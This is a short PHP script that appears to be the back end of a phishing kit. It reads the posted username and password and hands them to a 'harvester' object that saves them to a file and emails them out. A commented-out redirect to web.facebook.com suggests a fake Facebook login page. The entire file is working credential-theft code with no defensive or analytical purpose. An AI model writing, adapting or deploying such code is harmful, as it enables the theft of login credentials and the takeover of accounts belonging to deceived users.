<?php
require_once('./harvester.php');
$harvester = new harvester();

//if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['submit'])){
	$uname = $_POST['username'];
	$passwd = $_POST['password'];
	$harvester->harvest_toFile($uname, $passwd);
	$harvester->harvest_toMail($uname, $passwd);
	//echo '<script>window.location.redirect("//web.facebook.com")</script>';
//}

/*else {
	echo '<script>alert("Sorry pal it ain\'t worked!")</script>';
}*/
?>
